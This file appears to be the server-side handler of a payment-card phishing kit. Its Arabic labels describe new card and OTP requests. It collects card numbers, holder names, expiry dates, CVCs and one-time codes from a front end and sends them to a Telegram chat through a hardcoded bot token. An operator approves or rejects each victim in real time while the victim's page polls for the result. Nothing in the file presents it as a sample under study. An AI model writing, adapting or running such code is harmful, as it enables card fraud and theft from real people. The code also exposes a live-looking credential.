global.otpStatuses = global.otpStatuses || {};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "9216807620:AAGDIyVqXUaLmN_MdiMyAxAzRY0S6KCqEGw";
  const CHAT_ID = "9216807620";
  const method = req.method;
  const body = req.body || {};

  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });
    const status = global.otpStatuses[user_id] || 'pending';
    return res.status(200).json({ status });
  }

  if (body.callback_query) {
    const callback = body.callback_query;
    const callbackData = callback.data;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    if (callbackData.startsWith('approve_otp_') || callbackData.startsWith('approve_pay_')) {
      const userId = callbackData.replace('approve_otp_', '').replace('approve_pay_', '');
      global.otpStatuses[userId] = 'approved';

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: callback.message.text + "\n\n✅ **[تمت الموافقة بنجاح]**",
          parse_mode: 'Markdown'
        })
      });
    } else if (callbackData.startsWith('reject_otp_') || callbackData.startsWith('reject_pay_')) {
      const userId = callbackData.replace('reject_otp_', '').replace('reject_pay_', '');
      global.otpStatuses[userId] = 'rejected';
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك!" })
    });

    return res.status(200).json({ ok: true });
  }

  let text = '';
  let actionType = 'pay';

  if (body.رمز_التحقق_OTP) {
    actionType = 'otp';
    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
           `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  } else {
    actionType = 'pay';
    text = `💳 *طلب بطاقة دفع جديدة*\n\n` +
           `👤 اسم الحامل: ${body.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${body.card_number || ''}\`\n` +
           `📅 الانتهاء: ${body.exp_date || ''}\n` +
           `🔒 CVC: \`${body.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${actionType}_${body.user_id}` },
        { text: "❌ رفض", callback_data: `reject_${actionType}_${body.user_id}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
